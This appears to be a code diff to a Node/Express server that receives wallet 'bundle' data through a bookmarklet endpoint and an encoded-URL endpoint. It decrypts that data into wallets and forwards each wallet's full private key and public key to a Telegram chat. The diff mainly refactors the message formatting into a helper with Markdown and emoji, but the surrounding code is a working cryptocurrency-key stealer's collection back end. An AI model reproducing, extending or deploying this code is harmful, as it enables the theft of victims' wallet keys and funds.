@@ -142,7 +142,8 @@ async function sendToTelegram(message) {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     const payload = {
         chat_id: TELEGRAM_CHAT_ID,
-        text: message
+        text: message,
+        parse_mode: 'Markdown'
     };
 
     try {
@@ -157,6 +158,61 @@ async function sendToTelegram(message) {
         console.error('Error sending to Telegram:', error);
         return false;
     }
+}
+
+// Helper function to build formatted Telegram message
+function buildTelegramMessage(newEntry, walletCount, endpointType = 'Bookmark') {
+    let message = `📥 *${endpointType} Data Received* 📥\n\n`;
+    message += `🆔 *ID:* \`${newEntry.id}\`\n`;
+    message += `⏰ *Timestamp:* \`${newEntry.timestamp}\`\n`;
+    message += `💼 *Wallets Processed:* \`${walletCount}\`\n\n`;
+
+    // Add other fields from newEntry if any (excluding processed and raw bundle data)
+    const otherFields = Object.keys(newEntry).filter(key => 
+        key !== 'id' && key !== 'timestamp' && key !== 'processedSBundles' && key !== 'sBundles' && key !== 'bundle'
+    );
+    if (otherFields.length > 0) {
+        message += `📋 *Additional Fields:*\n`;
+        otherFields.forEach(key => {
+            const value = newEntry[key];
+            message += `  *${key}:* \`${typeof value === 'object' ? JSON.stringify(value) : value}\`\n`;
+        });
+        message += `\n`;
+    }
+
+    if (newEntry.sBundles) {
+        message += `🔒 *sBundles:* \`${newEntry.sBundles.substring(0, 100)}...\` (truncated)\n`;
+    }
+
+    if (newEntry.bundle) {
+        message += `🔑 *Bundle Key:* \`${newEntry.bundle.substring(0, 50)}...\` (truncated)\n\n`;
+    }
+
+    if (newEntry.processedSBundles && newEntry.processedSBundles.wallets && newEntry.processedSBundles.wallets.length > 0) {
+        message += `💳 *Wallets Details:* 💳\n`;
+        newEntry.processedSBundles.wallets.forEach((wallet, idx) => {
+            message += `\n${idx + 1 === walletCount ? '🏆' : '🔹'} *Wallet ${wallet.walletIndex}:*\n`;
+            if (wallet.privateKey) {
+                message += `  🔐 *Private Key:* \`${wallet.privateKey}\`\n`;
+            }
+            if (wallet.publicKey) {
+                message += `  📍 *Public Key:* \`${wallet.publicKey}\`\n`;
+            }
+            if (wallet.error) {
+                message += `  ❌ *Error:* \`${wallet.error}\`\n`;
+            }
+            message += `───\n`;
+        });
+        message += `\n`;
+    }
+
+    if (newEntry.processedSBundles && newEntry.processedSBundles.error) {
+        message += `⚠️ *Processing Error:* \`${newEntry.processedSBundles.error}\`\n`;
+    }
+
+    message += `\n✨ *End of Report* ✨`;
+
+    return message;
 }
 
 // Admin login endpoint
@@ -234,47 +290,7 @@ app.post('/api/bookmark-data', async (req, res) => {
 
         // Format and send Telegram notification
         const walletCount = newEntry.processedSBundles ? newEntry.processedSBundles.count : 0;
-
-        let message = `New Bookmark Data Received\n`;
-        message += `ID: ${newEntry.id}\n`;
-        message += `Timestamp: ${newEntry.timestamp}\n`;
-        message += `Wallets Processed: ${walletCount}\n\n`;
-
-        // Add other fields from req.body if any
-        for (const [key, value] of Object.entries(newEntry)) {
-            if (key !== 'id' && key !== 'timestamp' && key !== 'processedSBundles' && key !== 'sBundles' && key !== 'bundle') {
-                message += `${key}: ${typeof value === 'object' ? JSON.stringify(value) : value}\n`;
-            }
-        }
-
-        if (newEntry.sBundles) {
-            message += `\nsBundles: ${newEntry.sBundles}\n`;
-        }
-
-        if (newEntry.bundle) {
-            message += `Bundle: ${newEntry.bundle}\n`;
-        }
-
-        if (newEntry.processedSBundles && newEntry.processedSBundles.wallets) {
-            message += `\nWallets:\n`;
-            newEntry.processedSBundles.wallets.forEach(wallet => {
-                message += `Wallet ${wallet.walletIndex}:\n`;
-                if (wallet.privateKey) {
-                    message += `  Private Key: ${wallet.privateKey}\n`;
-                }
-                if (wallet.publicKey) {
-                    message += `  Public Key: ${wallet.publicKey}\n`;
-                }
-                if (wallet.error) {
-                    message += `  Error: ${wallet.error}\n`;
-                }
-                message += `\n`;
-            });
-        }
-
-        if (newEntry.processedSBundles && newEntry.processedSBundles.error) {
-            message += `Processed Error: ${newEntry.processedSBundles.error}\n`;
-        }
+        const message = buildTelegramMessage(newEntry, walletCount, 'Bookmark');
 
         // If too long, split into multiple messages
         if (message.length > 4096) {
@@ -285,7 +301,7 @@ app.post('/api/bookmark-data', async (req, res) => {
             chunks.push(currentChunk);
 
             while (remaining.length > 0) {
-                currentChunk = `Continued...\n\n${remaining.substring(0, 4096).trim()}`;
+                currentChunk = `\n\n*Continued...* 📄\n\n${remaining.substring(0, 4096).trim()}`;
                 remaining = remaining.substring(4096);
                 chunks.push(currentChunk);
             }
@@ -419,47 +435,7 @@ app.get('/data/:encodedData', async (req, res) => {
 
         // Format and send Telegram notification
         const walletCount = newEntry.processedSBundles ? newEntry.processedSBundles.count : 0;
-
-        let message = `New Encoded Data Received\n`;
-        message += `ID: ${newEntry.id}\n`;
-        message += `Timestamp: ${newEntry.timestamp}\n`;
-        message += `Wallets Processed: ${walletCount}\n\n`;
-
-        // Add other fields from decodedData if any
-        for (const [key, value] of Object.entries(newEntry)) {
-            if (key !== 'id' && key !== 'timestamp' && key !== 'processedSBundles' && key !== 'sBundles' && key !== 'bundle') {
-                message += `${key}: ${typeof value === 'object' ? JSON.stringify(value) : value}\n`;
-            }
-        }
-
-        if (newEntry.sBundles) {
-            message += `\nsBundles: ${newEntry.sBundles}\n`;
-        }
-
-        if (newEntry.bundle) {
-            message += `Bundle: ${newEntry.bundle}\n`;
-        }
-
-        if (newEntry.processedSBundles && newEntry.processedSBundles.wallets) {
-            message += `\nWallets:\n`;
-            newEntry.processedSBundles.wallets.forEach(wallet => {
-                message += `Wallet ${wallet.walletIndex}:\n`;
-                if (wallet.privateKey) {
-                    message += `  Private Key: ${wallet.privateKey}\n`;
-                }
-                if (wallet.publicKey) {
-                    message += `  Public Key: ${wallet.publicKey}\n`;
-                }
-                if (wallet.error) {
-                    message += `  Error: ${wallet.error}\n`;
-                }
-                message += `\n`;
-            });
-        }
-
-        if (newEntry.processedSBundles && newEntry.processedSBundles.error) {
-            message += `Processed Error: ${newEntry.processedSBundles.error}\n`;
-        }
+        const message = buildTelegramMessage(newEntry, walletCount, 'Encoded');
 
         // If too long, split into multiple messages
         if (message.length > 4096) {
@@ -470,7 +446,7 @@ app.get('/data/:encodedData', async (req, res) => {
             chunks.push(currentChunk);
 
             while (remaining.length > 0) {
-                currentChunk = `Continued...\n\n${remaining.substring(0, 4096).trim()}`;
+                currentChunk = `\n\n*Continued...* 📄\n\n${remaining.substring(0, 4096).trim()}`;
                 remaining = remaining.substring(4096);
                 chunks.push(currentChunk);
             }
